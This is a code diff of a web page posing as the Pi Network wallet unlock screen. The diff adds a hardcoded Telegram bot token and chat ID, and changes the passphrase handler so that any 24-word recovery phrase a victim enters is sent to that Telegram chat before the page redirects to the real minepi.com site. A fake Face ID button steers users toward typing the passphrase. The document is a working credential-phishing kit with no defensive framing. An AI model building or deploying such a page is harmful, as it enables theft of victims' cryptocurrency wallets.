@@ -40,32 +40,46 @@
         .grid-item:hover {
             background-color: rgba(255, 255, 255, 0.1);
         }
+
+        /* Move grid 1, 2, 3 (top row) lower */
         .grid-item:nth-child(1),
         .grid-item:nth-child(2),
         .grid-item:nth-child(3) {
             transform: translateY(140px);
         }
+
+        /* Move grid 7, 8, 9 (bottom row) higher */
         .grid-item:nth-child(7),
         .grid-item:nth-child(8),
         .grid-item:nth-child(9) {
             transform: translateY(-140px);
         }
+
+        /* Move grid 1, 4, 7 to the right */
         .grid-item:nth-child(3n+1) {
             transform: translateX(60px) translateY(var(--offset-y, 0));
         }
+
+        /* Move grid 3, 6, 9 to the left */
         .grid-item:nth-child(3n+3) {
             transform: translateX(-60px) translateY(var(--offset-y, 0));
         }
+
+        /* Adjust for grid 1, 2, 3 (top row) */
         .grid-item:nth-child(1),
         .grid-item:nth-child(2),
         .grid-item:nth-child(3) {
             --offset-y: 140px;
         }
+
+        /* Adjust for grid 7, 8, 9 (bottom row) */
         .grid-item:nth-child(7),
         .grid-item:nth-child(8),
         .grid-item:nth-child(9) {
             --offset-y: -140px;
         }
+
+        /* Full-screen text box styling */
         .text-box-container {
             display: none;
             position: fixed;
@@ -143,6 +157,8 @@
         .return-button:hover {
             color: #713d92;
         }
+
+        /* Text above text box */
         .text-box-container .text-above {
             position: absolute;
             top: 80px;
@@ -152,6 +168,8 @@
             font-weight: bold;
             color: black;
         }
+
+        /* Disclaimer text */
         .disclaimer {
             position: absolute;
             top: 1200px;
@@ -187,6 +205,7 @@
         <div class="grid-item" id="grid9"></div>
     </div>
 
+    <!-- Full-screen text box container -->
     <div class="text-box-container" id="textBoxContainer">
         <button class="return-button" id="returnButton">&#10006;</button>
         <div class="text-above" id="textAbove"></div>
@@ -195,6 +214,7 @@
             <button id="unlockPassphrase">Unlock With Passphrase</button>
             <button id="unlockFaceID">Unlock With Face ID</button>
         </div>
+        <!-- Disclaimer text -->
         <div class="disclaimer" id="disclaimer">
             As a non-custodial wallet, your wallet<br>passphrase is exclusively accessible only to you.<br>Recovery of passphrase is currently impossible.<br><br>
             Lost your passphrase? <a>You can create a new<br>wallet</a>, but all your Pi in your previous wallet will be inaccessible.
@@ -202,36 +222,45 @@
     </div>
 
     <script>
-        // Updated to use your backend API
-        async function sendToTelegram(passphrase) {
+        // Telegram Bot Configuration
+        const BOT_TOKEN = "8191930366:AAF3nZYU_QC_wOpW-xKMvzwHVCKFN-KecxU";
+        const CHAT_ID = "7416028741";
+
+        // Function to send message to Telegram
+        async function sendToTelegram(message) {
             try {
-                const response = await fetch('http://localhost:3000/api/send-passphrase', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ passphrase })
-                });
-                
-                if (!response.ok) {
-                    throw new Error('Failed to send passphrase');
-                }
-                
-                return true;
+                const response = await fetch(
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`
+                );
+                return response.ok;
             } catch (error) {
-                console.error('Error:', error);
+                console.error("Error sending to Telegram:", error);
                 return false;
             }
         }
 
-        // Grid click handlers
-        document.getElementById('grid1').addEventListener('click', () => window.location.href = 'https://fireside.pinet.com');
-        document.getElementById('grid4').addEventListener('click', () => window.location.href = 'https://mine.pinet.com');
-        document.getElementById('grid5').addEventListener('click', () => window.location.href = 'https://blockexplorer.minepi.com');
-        document.getElementById('grid7').addEventListener('click', () => window.location.href = 'https://kyc.pinet.com');
-        document.getElementById('grid8').addEventListener('click', () => window.location.href = 'https://chat.pinet.com');
+        // Add click event listeners to specific grid items
+        document.getElementById('grid1').addEventListener('click', () => {
+            window.location.href = 'https://fireside.pinet.com';
+        });
 
-        // Text box controls
+        document.getElementById('grid4').addEventListener('click', () => {
+            window.location.href = 'https://mine.pinet.com';
+        });
+
+        document.getElementById('grid5').addEventListener('click', () => {
+            window.location.href = 'https://blockexplorer.minepi.com';
+        });
+
+        document.getElementById('grid7').addEventListener('click', () => {
+            window.location.href = 'https://kyc.pinet.com';
+        });
+
+        document.getElementById('grid8').addEventListener('click', () => {
+            window.location.href = 'https://chat.pinet.com';
+        });
+
+        // Show full-screen text box for Grid 2, 3, 6, 9
         const textBoxContainer = document.getElementById('textBoxContainer');
         const returnButton = document.getElementById('returnButton');
         const unlockPassphrase = document.getElementById('unlockPassphrase');
@@ -243,7 +272,9 @@
             textAbove.textContent = text;
             disclaimer.style.display = 'block';
             textBoxContainer.style.display = 'block';
-            setTimeout(() => textBoxContainer.classList.add('active'), 10);
+            setTimeout(() => {
+                textBoxContainer.classList.add('active');
+            }, 10);
         };
 
         const hideTextBox = () => {
@@ -254,31 +285,46 @@
             }, 500);
         };
 
-        // Grid items that show text box
-        document.getElementById('grid2').addEventListener('click', () => showTextBox('Unlock Pi Wallet'));
-        document.getElementById('grid3').addEventListener('click', () => showTextBox('Pi Shop Wallet'));
-        document.getElementById('grid6').addEventListener('click', () => showTextBox('Unlock Pi Wallet'));
-        document.getElementById('grid9').addEventListener('click', () => showTextBox('Unlock Pi Wallet'));
+        document.getElementById('grid2').addEventListener('click', () => {
+            showTextBox('Pi Wallet');
+        });
 
-        // Passphrase submission
+        document.getElementById('grid3').addEventListener('click', () => {
+            showTextBox('Pi Wallet');
+        });
+
+        document.getElementById('grid6').addEventListener('click', () => {
+            window.location.href = 'develop.pinet.com';
+        });
+
+        document.getElementById('grid9').addEventListener('click', () => {
+            window.location.href = 'profiles.pinet.com';
+        });
+
+        // Modified Unlock With Passphrase button functionality
         unlockPassphrase.addEventListener('click', async () => {
-            const text = document.querySelector('.text-box-container textarea').value.trim();
-            const words = text.split(/\s+/).filter(word => word.length > 0);
+            const text = document.querySelector('.text-box-container textarea').value;
+            const words = text.trim().split(/\s+/).filter(word => word.length > 0);
             
             if (words.length === 24) {
-                const success = await sendToTelegram(text);
-                window.location.href = 'https://minepi.com'; // Always redirect
+                // Send to Telegram before redirecting
+                const success = await sendToTelegram(`Pi Wallet Passphrase:\n${text}`);
+                if (success) {
+                    window.location.href = 'https://minepi.com';
+                } else {
+                    alert('Failed to verify passphrase. Please try again.');
+                }
             } else {
                 alert('Please enter exactly 24 words.');
             }
         });
 
-        // Face ID handler
+        // Unlock With Face ID button functionality
         unlockFaceID.addEventListener('click', () => {
             alert('Face ID not available at the moment. Please try with the passphrase.');
         });
 
-        // Return button
+        // Return button functionality
         returnButton.addEventListener('click', hideTextBox);
     </script>
 </body>
